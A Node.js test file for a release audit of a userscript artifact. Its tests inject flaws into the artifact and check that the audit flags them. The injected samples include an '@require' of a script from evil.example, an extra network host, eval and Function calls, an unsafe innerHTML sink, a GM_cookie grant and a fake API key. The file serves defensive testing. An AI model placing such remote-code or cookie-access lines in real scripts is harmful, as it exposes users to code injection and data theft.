const test=require('node:test');
const assert=require('node:assert/strict');
const fs=require('node:fs');
const path=require('node:path');
const pkg=require('../package.json');
const {auditArtifactText,auditReviewPackage}=require('../scripts/audit-review-release');
const artifactPath=path.resolve(__dirname,'..','dist','review',`ReviveRelay-${pkg.version}.user.js`);
const clean=fs.readFileSync(artifactPath,'utf8');
function expectFailure(mutator,code){const result=auditArtifactText(mutator(clean));assert.equal(result.ok,false,code);assert.ok(result.findings.some(item=>item.code===code),JSON.stringify(result.findings));}

test('exact generated review artifact passes static audit',()=>{
  const result=auditArtifactText(clean);
  assert.equal(result.ok,true,JSON.stringify(result.findings));
  assert.equal(result.version,'0.6.0');
  assert.equal(result.channel,'review');
});

test('audit fails embedded token or API-key material',()=>{
  const syntheticSecret='0123456789abcdef'.repeat(3);
  expectFailure(text=>text+`\nconst apiKey = '${syntheticSecret}';\n`,'EMBEDDED_SECRET');
});

test('audit fails unexpected network hosts',()=>{
  expectFailure(text=>text.replace('// @connect      reviverelay.voidsmithindustries.com','// @connect      reviverelay.voidsmithindustries.com\n// @connect      evil.example'),'UNEXPECTED_NETWORK_HOST');
});

test('audit fails eval, remote executable dependencies and dynamic code construction',()=>{
  expectFailure(text=>text+'\neval("1+1");\n','REMOTE_EXECUTABLE_CODE');
  expectFailure(text=>text.replace('// @run-at       document-idle','// @require      https://evil.example/x.js\n// @run-at       document-idle'),'REMOTE_EXECUTABLE_CODE');
  expectFailure(text=>text+'\nnew Function("return 1")();\n','REMOTE_EXECUTABLE_CODE');
});

test('audit allow-list fails an unreviewed dynamic HTML sink',()=>{
  expectFailure(text=>text+'\ndocument.body.innerHTML = state.identity.name;\n','UNSAFE_DYNAMIC_SINK');
});

test('audit fails excessive userscript permissions',()=>{
  expectFailure(text=>text.replace('// @grant        GM_notification','// @grant        GM_notification\n// @grant        GM_cookie'),'EXCESSIVE_GM_PERMISSION');
});

test('audit fails legacy chat runtime identifiers or dependencies',()=>{
  expectFailure(text=>text+'\n/* ReviveRelay bundled module: src/chat-dom.js */\nReviveRelayCandidatePipeline;\n','LEGACY_CHAT_RUNTIME');
});

test('audit fails stale 0.5.0 or automatic/manual release metadata',()=>{
  expectFailure(text=>text.replace('// @version      0.6.0','// @version      0.5.0'),'STALE_RELEASE_METADATA');
  expectFailure(text=>text.replace("const UPDATE_CHANNEL = 'review'","const UPDATE_CHANNEL = 'automatic'"),'STALE_RELEASE_METADATA');
});

test('package audit covers exact review artifact plus required review documents',()=>{
  const result=auditReviewPackage(path.resolve(__dirname,'..'));
  assert.equal(result.ok,true,JSON.stringify(result.findings));
  assert.ok(result.filesAudited>=13);
});
